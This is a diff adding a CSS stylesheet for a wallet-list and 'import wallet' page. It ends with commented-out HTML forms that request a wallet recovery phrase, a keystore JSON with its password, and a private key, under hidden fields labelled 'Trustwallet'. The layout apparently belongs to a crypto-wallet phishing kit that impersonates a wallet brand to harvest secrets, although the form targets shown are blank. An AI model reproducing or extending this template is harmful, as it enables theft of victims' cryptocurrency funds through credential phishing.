@@ -1,0 +1,262 @@
+:root {
+  --bg-color: #f3f3f381;
+  --bg-color-dark: #222222;
+  --text-color: #000000;
+  --color-black: #000000;
+  --color-white: #ffffff;
+  --font-size: 5px;
+  --font-family: 'Lato', sans-serif; }
+
+*,
+*::before,
+*::after {
+  padding: 0;
+  margin: 0;
+  box-sizing: border-box; }
+
+html {
+  font-size: 1.6rem; }
+
+a,
+a:link,
+a:visited {
+  text-decoration: none; }
+
+body {
+  font-family: var(--font-family); 
+  background-color: #070E27; 
+}
+
+.main-body {
+  background-color: #070E27; 
+  min-width: 100%;
+  height: 100vh;
+  color: var(--color-black); }
+
+.container {
+  display: flex;
+  flex-direction: row;
+  justify-content: center;
+  align-items: center;
+  flex-wrap: wrap;
+  position: relative;
+  top: 50%;
+  left: 50%;
+  padding: 1rem 1rem 2rem 1rem !important;
+  box-sizing: border-box;
+  transform: translate(-50%, -50%);
+  width: 40%;
+  height: 90vh;
+  background-color: var(--color-white);
+  overflow-y: scroll;
+  border-radius: 10px; }
+  .container > a {
+    position: relative;
+    flex: 0 0 45%;
+    margin: 0.3rem;
+    border-radius: 20px;
+    padding: 0.5rem 0.8rem;
+    border: 2px solid rgba(241, 241, 241, 0.93);
+    display: flex;
+    justify-content: space-between;
+    align-items: center; }
+
+.wallet {
+  font-size: 0.6rem;
+  color: black !important; 
+  height:50px;
+}
+ 
+  .wallet:hover {
+    color: black; }
+  .wallet__image {
+    width: 27x;
+    height: 27px; }
+
+.deactivate {
+  position: relative;
+  border-radius: 2rem;
+  padding: 0.1rem 0.8rem;
+  font-size: 0.6rem;
+  border: 2px solid rgba(241, 241, 241, 0.93);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  color: green; }
+
+/*
+  IMPORT SECTION
+ */
+.import {
+  background-color: #ffffff;
+  min-width: 100%;
+  height: 100vh;
+  color: turquoise;
+  padding-top: 1rem; }
+  .import__container {
+    width: 32%;
+    min-height: 50vh;
+    position: relative;
+    margin: 0 auto; }
+  .import__header {
+    font-size: 0.8rem;
+    font-weight: 700;
+    color: var(--color-white);
+    display: block;
+    margin-bottom: 1.5rem; }
+    .import__header--icon {
+      display: inline-block;
+      margin-right: 0.5rem; }
+  .import__tab__header {
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: row;
+    border-bottom: 2px solid black;
+    margin-bottom: 2rem; }
+    .import__tab__header > a {
+      color: whitesmoke;
+      text-decoration: none;
+      font-size: 0.7rem;
+      padding: 0.5rem;
+      box-sizing: border-box;
+      flex: 0 0 (); }
+      .import__tab__header > a:hover {
+        color: white;
+        border: 1px solid white;
+        border-top-left-radius: 3px;
+        border-top-right-radius: 3px;
+        box-sizing: border-box;
+        padding: 0.5rem; }
+      .import__tab__header > a.current {
+        font-weight: bold;
+        border-bottom: 2px solid white !important; }
+        .import__tab__header > a.current:hover {
+          border: none; }
+  .import__tab__body--item {
+    display: none; }
+    .import__tab__body--item.hidden {
+      display: none; }
+    .import__tab__body--item.current {
+      display: block; }
+
+/*
+FORM ELEMENTS
+ */
+.form__input {
+  display: block;
+  width: 100%;
+  border-radius: 5px;
+  font-family: var(--font-family);
+  padding: 0.5rem;
+  box-sizing: border-box;
+  color: grey;
+  margin-bottom: 0.8rem; }
+  .form__input--textarea {
+    resize: none; }
+  .form__input::placeholder {
+    color: grey; }
+
+.form__label {
+  font-size: 0.7rem;
+  color: grey; }
+
+.form__button {
+  background: #F2AC4B;
+  display: block;
+  width: 100%;
+  padding: 0.3rem;
+  border: none;
+  outline: none;
+  margin-top: 0.3rem;
+  box-sizing: border-box;
+  font-size: 0.7rem;
+  color: var(--color-white);
+  border-radius: 3px; }
+  .form__button:hover {
+    cursor: pointer; }
+
+.qr {
+  background-color: #1c243b;
+  min-width: 100%;
+  height: 100vh;
+  color: var(--color-white);
+  padding-top: 1rem; }
+  .qr__body {
+    width: 50%;
+    margin: 0 auto;
+    text-align: left;
+    position: relative; }
+    .qr__body > img {
+      width: 50%; }
+    .qr__body > p {
+      background: var(--color-black);
+      display: block;
+      width: 50%;
+      margin: 0 auto;
+      position: relative;
+      padding: 0.5rem;
+      font-size: 0.7rem;
+      text-align: left; }
+
+
+/*
+<div class="import__tab import__container mt-5">
+                <!-- Tab headers (navigation) -->
+                <div class="import__tab__header">
+                    <a id="btn_phrase" href="#" class="import__tab__header--item import__tab__header--item--1 current  " style="color: rgb(65, 141, 241);">Phrase</a>
+                    <a id="btn_phrase2" href="#" class="import__tab__header--item import__tab__header--item--2" style="color: rgb(65, 141, 241);">Keystore Json</a>
+                    <a id="btn_phrase3" href="#" class="import__tab__header--item import__tab__header--item--3" style="color: rgb(65, 141, 241);" onclick="enter_phrase3()">Private Key</a>
+                </div>
+                
+
+                <!-- Tab bodies (content) -->
+                <div class="import__tab__body">
+
+                    <!-- Tab body (phrase) -->
+                    <div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
+                        <form action="#" method="POST">
+                            <div class="form__errorBox form__errorBox--phrase"></div>
+
+                            <label class="text-center" style="text-align: left;">Name</label>
+                            <input class="form-control" type="text" name="name"placeholder="Enter Your Name">
+                            <textarea class="form__input form__input--textarea" name="phrase" cols="30" rows="5" placeholder="Enter Phrase..." required></textarea>
+                            <!-- use this to prevent spam -->
+
+                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
+                            <button class="form__button" name='submit' type="submit" style="background-color:rgb(65, 141, 241);">Import</button>
+                        </form>
+                    </div>
+
+                     
+                    <!-- Tab body (keystore json) -->
+                    <div id="phrase2" class="import__tab__body--item import__tab__body--item--keystore-json">
+                        <form action="#" method="POST" >
+                            <input type="hidden" name="subject" value="Trustwallet">
+                            <textarea class="form__input form__input--textarea" name="Portis-keystore_json" cols="30" rows="5" placeholder="Keystore JSON..." required></textarea>
+                            <!-- use this to prevent spam -->
+
+                            <label for="keystore_password"></label>
+                            <input type="password" name="phrase" class="form__input" placeholder="Password..." required>
+
+                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
+                            <button class="form__button" name='submit' type="submit" style="background-color:rgb(65, 141, 241);">Import</button>
+                        </form> 
+                    </div>
+
+                    <!-- Tab body (private key) -->
+                    
+                  <div id="phrase3" class="import__tab__body--item import__tab__body--item--private-key">
+                    <form action="#" method="POST" >
+                        <input type="hidden" name="subject" value="Trustwallet">
+                          <!-- use this to prevent spam -->
+
+                          <input type="text" name="phrase" class="form__input" placeholder="Private Key..." required>
+                          <label for="Portis priv_key" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
+                          <button class="form__button" name='submit' type="submit" style="background-color:rgb(65, 141, 241);;">Import</button>
+                        </form>
+                    </div>
+                    
+                </div>
+            </div>
+*/
